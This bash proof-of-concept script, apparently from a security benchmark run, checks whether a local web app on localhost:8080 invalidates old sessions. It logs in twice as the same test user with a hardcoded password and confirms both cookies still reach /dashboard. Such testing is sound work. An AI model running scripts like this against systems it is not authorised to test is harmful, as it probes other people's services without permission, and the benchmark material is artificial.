#!/bin/bash
# POC: Demonstrates that multiple concurrent sessions can be created for the same user and remain simultaneously valid without invalidation
# Target: ./repo
# Created: 2025-11-04T17:43:32.884Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# Concurrent Session Limiting Vulnerability POC
# Demonstrates that multiple sessions can be created and remain valid simultaneously

TARGET_URL="http://localhost:8080"
TEMP_DIR=$(mktemp -d)
COOKIES_1="$TEMP_DIR/cookies1.txt"
COOKIES_2="$TEMP_DIR/cookies2.txt"

echo "[*] Testing for Concurrent Session Limiting Vulnerability"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Create first session
echo "[1] Creating first session (Session 1)..."
RESPONSE_1=$(curl -s -c "$COOKIES_1" -X POST \
  "$TARGET_URL/password/test" \
  -d "password=test&user_id=10029" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w "\n%{http_code}")

HTTP_CODE_1=$(echo "$RESPONSE_1" | tail -n 1)
SESSION_1=$(grep -oP 'session=\K[^;]+' "$COOKIES_1" 2>/dev/null || echo "NOT_FOUND")

echo "    HTTP Status: $HTTP_CODE_1"
echo "    Session 1: $SESSION_1"
echo ""

# Step 2: Create second session (same user, should invalidate first)
echo "[2] Creating second session (Session 2) for same user..."
RESPONSE_2=$(curl -s -c "$COOKIES_2" -X POST \
  "$TARGET_URL/password/test" \
  -d "password=test&user_id=10029" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w "\n%{http_code}")

HTTP_CODE_2=$(echo "$RESPONSE_2" | tail -n 1)
SESSION_2=$(grep -oP 'session=\K[^;]+' "$COOKIES_2" 2>/dev/null || echo "NOT_FOUND")

echo "    HTTP Status: $HTTP_CODE_2"
echo "    Session 2: $SESSION_2"
echo ""

# Step 3: Verify Session 1 is still valid
echo "[3] Verifying Session 1 remains valid..."
VERIFY_1=$(curl -s -b "$COOKIES_1" "$TARGET_URL/dashboard" -w "\n%{http_code}" | tail -n 1)
echo "    Session 1 status when accessing /dashboard: $VERIFY_1"

if [ "$VERIFY_1" == "200" ]; then
    echo "    ✓ Session 1 is STILL VALID"
    SESSION_1_VALID=true
else
    echo "    ✗ Session 1 is invalid"
    SESSION_1_VALID=false
fi
echo ""

# Step 4: Verify Session 2 is valid
echo "[4] Verifying Session 2 is valid..."
VERIFY_2=$(curl -s -b "$COOKIES_2" "$TARGET_URL/dashboard" -w "\n%{http_code}" | tail -n 1)
echo "    Session 2 status when accessing /dashboard: $VERIFY_2"

if [ "$VERIFY_2" == "200" ]; then
    echo "    ✓ Session 2 is VALID"
    SESSION_2_VALID=true
else
    echo "    ✗ Session 2 is invalid"
    SESSION_2_VALID=false
fi
echo ""

# Step 5: Determine vulnerability status
echo "[5] VULNERABILITY ASSESSMENT:"
if [ "$SESSION_1_VALID" == "true" ] && [ "$SESSION_2_VALID" == "true" ]; then
    echo "    ✓✓ VULNERABLE: Both sessions are simultaneously valid!"
    echo "    → The application does NOT limit concurrent sessions"
    echo "    → Multiple sessions for the same user can coexist"
    VULNERABLE=true
elif [ "$SESSION_1_VALID" == "false" ] && [ "$SESSION_2_VALID" == "true" ]; then
    echo "    ✓ NOT VULNERABLE: Session 1 was invalidated when Session 2 was created"
    echo "    → Proper concurrent session limiting is implemented"
    VULNERABLE=false
else
    echo "    ? INCONCLUSIVE: Unable to determine session state"
    VULNERABLE=false
fi

# Cleanup
rm -rf "$TEMP_DIR"

echo ""
echo "[*] POC Complete"

# Exit with status indicating vulnerability
[ "$VULNERABLE" == "true" ] && exit 0 || exit 1